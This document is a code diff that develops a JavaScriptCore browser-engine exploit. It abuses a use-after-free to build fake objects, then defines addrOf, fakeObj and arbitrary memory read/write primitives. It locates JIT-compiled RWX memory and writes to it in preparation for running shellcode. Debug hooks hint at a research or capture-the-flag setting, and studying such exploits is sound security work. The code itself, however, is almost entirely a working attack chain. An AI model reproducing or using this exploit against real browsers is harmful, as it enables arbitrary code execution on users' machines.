@@ -57,7 +57,40 @@ function callback0(ev) {
 
 var big_guys = [];
 var spray_obj = []
-var hold_structure;
+var fake_arr;
+var overwrite_obj;
+
+var rwObj;
+var rwObjBufferAddr;
+var fakeRwObj;
+var fakeInnerObj;
+
+function addrOf(obj) {
+    overwrite_obj.j = obj;
+    return Int64.from_double(fake_arr[3]);
+}
+
+function fakeObj(addr) {
+    fake_arr[3] = Int64.to_double(addr);
+    return overwrite_obj.j;
+}
+
+function read64(addr) {
+    for (let i = 0; i < 0x1000; i++) {
+        fakeRwObj[5] = Int64.to_double(Int64.sub(addr, 8 * i));
+        let value = fakeInnerObj[i];
+        if (value) {
+            return Int64.from_double(value);
+        }
+    }
+    throw '[-] Failed to read: ' + addr;
+}
+
+function write64(addr, value) {
+    fakeRwObj[5] = Int64.to_double(addr);
+    fakeInnerObj[0] = Int64.to_double(value);
+}
+
 function callback(ev) {
     gc();
 
@@ -75,10 +108,8 @@ function callback(ev) {
     for (let i = 0; i < 2; ++i)
         spray_obj.push({a: 1, b: 2, c: 3, d: 4, e: 5});
     let dummy = {a: 1, b: 2, c: 3, d: 4, e: 5};
-    let fake_obj_1 = {a: 1, b: 2, c: 3, d: 4, e: 5};
-    let fake_obj_2 = {a: 1, b: 2, c: 3, d: 4, e: 5};
-    reclaim_obj.a = fake_obj_1;
-    reclaim_obj.b = fake_obj_2;
+    let fake_obj = {a: 1, b: 2, c: 3, d: 4, e: 5};
+    reclaim_obj.a = fake_obj;
 
     /*
     document.leakAddr(reclaim_obj);
@@ -87,40 +118,176 @@ function callback(ev) {
     */
 
     dummy = undefined;
-    fake_obj_1 = undefined;
-    fake_obj_2 = undefined;
+    fake_obj = undefined;
     reclaim_obj = undefined;
     gc();
 
-    let fake_arr_1 = worker.a;
-    let fake_arr_2 = worker.b;
-    var overwrite_obj = new X([1.1, 2.2, 3.3, 4.4]);
+    fake_arr = worker.a;
+    overwrite_obj = new X([1.1, 2.2, 3.3, 4.4]);
     overwrite_obj.g = Int64.JSC_as_JSValue(0x0100180800000000);
-    overwrite_obj.h = fake_arr_1;
+    overwrite_obj.h = fake_arr;
 
     /*
     document.leakAddr(overwrite_obj);
     document.leakAddr(worker.a);
-    document.leakAddr(fake_arr_1);
+    document.leakAddr(fake_arr);
     document.leakAddr(worker.b);
-    document.leakAddr(fake_arr_2);
     */
  
-    var leaked_obj_header = Int64.from_double(fake_arr_1[22]);
-    leaked_obj_header.high = 0x01100300;
+    var leaked_header = Int64.from_double(fake_arr[12]);
+    leaked_header.high = 0x01082207;
     // alert(leaked_header);
+    overwrite_obj.g = Int64.JSC_as_JSValue(leaked_header);
 
-    overwrite_obj.g = Int64.JSC_as_JSValue(leaked_obj_header);
-    overwrite_obj.h = fake_arr_2;
-    overwrite_obj.o = Int64.JSC_as_JSValue(0x0002000000000002);
-    overwrite_obj.p = overwrite_obj.i;
-    var leaked_data = Symbol.prototype.toString.call(fake_arr_1);
+    rwObj = {
+        _: 1.1,
+        length: Int64.JSC_as_JSValue(0x4141414141414141),
+        id: Int64.JSC_as_JSValue(leaked_header),
+        butterfly: 1.1,
 
-    var leaked_array_header = extract(leaked_data, 0);
-    var leaked_array_butterfly = extract(leaked_data, 4);
-    alert(leaked_array_butterfly);
+        __: 1.1,
+        innerLength: Int64.JSC_as_JSValue(0x4141414141414141),
+        innerId: Int64.JSC_as_JSValue(leaked_header),
+        innerButterfly: 1.1,
+    };
+
+    rwObjBufferAddr = Int64.add(addrOf(rwObj), 0x20);
+    fakeRwObj = fakeObj(rwObjBufferAddr);   
+    rwObj.butterfly = fakeRwObj;
+    fakeInnerObj = fakeObj(Int64.add(rwObjBufferAddr, 0x20));
+    rwObj.innerButterfly = fakeInnerObj;
+
+    var [_JITFunc, rwxMemAddr] = getJITFunction();
+
+    alert(rwxMemAddr);
+    for (let i = 0; i < 300; i++)
+        write64(Int64.add(rwxMemAddr, i), new Int64(0x41));
+    /*
+    setJITCodeAddr(alert, rwxMemAddr);
+    alert(1);
+    */
 
     while (true) {}
+}
+
+function makeJITCompiledFunction() {
+    var obj = {};
+    function target(num) {
+        num ^= Math.random() * 10000;
+        num ^= 0x70000001;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000002;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000003;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000004;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000005;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000006;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000007;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000008;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000009;
+        num ^= Math.random() * 10000;
+        num ^= 0x7000000a;
+        num ^= Math.random() * 10000;
+        num ^= 0x7000000b;
+        num ^= Math.random() * 10000;
+        num ^= 0x7000000c;
+        num ^= Math.random() * 10000;
+        num ^= 0x7000000d;
+        num ^= Math.random() * 10000;
+        num ^= 0x7000000e;
+        num ^= Math.random() * 10000;
+        num ^= 0x7000000f;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000010;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000011;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000012;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000013;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000014;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000015;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000016;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000017;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000018;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000019;
+        num ^= Math.random() * 10000;
+        num ^= 0x7000001a;
+        num ^= Math.random() * 10000;
+        num ^= 0x7000001b;
+        num ^= Math.random() * 10000;
+        num ^= 0x7000001c;
+        num ^= Math.random() * 10000;
+        num ^= 0x7000001d;
+        num ^= Math.random() * 10000;
+        num ^= 0x7000001e;
+        num ^= Math.random() * 10000;
+        num ^= 0x7000001f;
+        num ^= Math.random() * 10000;
+        num ^= 0x70000020;
+        num ^= Math.random() * 10000;
+        num &= 0xffff;
+        return num;
+    }
+
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+
+    return target;
+}
+    
+function getJITCodeAddr(func) {
+    let funcAddr = addrOf(func);
+    // alert("[+] Target function @ " + funcAddr);
+    let executableAddr = read64(Int64.add(funcAddr, 3 * 8));
+    // alert("[+] Executable instance @ " + executableAddr);
+
+    let jitCodeAddr = read64(Int64.add(executableAddr, 3 * 8));
+    // alert("[+] JITCode instance @ " + jitCodeAddr);
+
+    if (Int64.and(jitCodeAddr, new Int64('0xFFFF800000000000')).toString() != '0x0000000000000000' ||
+        Int64.and(Int64.sub(jitCodeAddr, new Int64('0x100000000')), new Int64('0x8000000000000000')).toString() != '0x0000000000000000') {
+        jitCodeAddr = Int64.add(Int64.shiftLeft(read64(Int64.add(executableAddr, 3 * 8 + 1)), 1), 0x100);
+        // alert("[+] approx. JITCode instance @ " + jitCodeAddr);
+    }
+
+    return jitCodeAddr;
+}
+
+function setJITCodeAddr(func, addr) {
+    let funcAddr = addrOf(func);
+    // alert("[+] Target function @ " + funcAddr);
+    let executableAddr = read64(Int64.add(funcAddr, 3 * 8));
+    // alert("[+] Executable instance @ " + executableAddr);
+    document.leakAddr(func);
+    write64(Int64.add(executableAddr, 3 * 8), addr);
+    document.leakAddr(func);
+}
+
+function getJITFunction() {
+    let shellcodeFunc = makeJITCompiledFunction();
+    shellcodeFunc();
+    let jitCodeAddr = getJITCodeAddr(shellcodeFunc);
+    return [shellcodeFunc, jitCodeAddr];
 }
 
 </script>
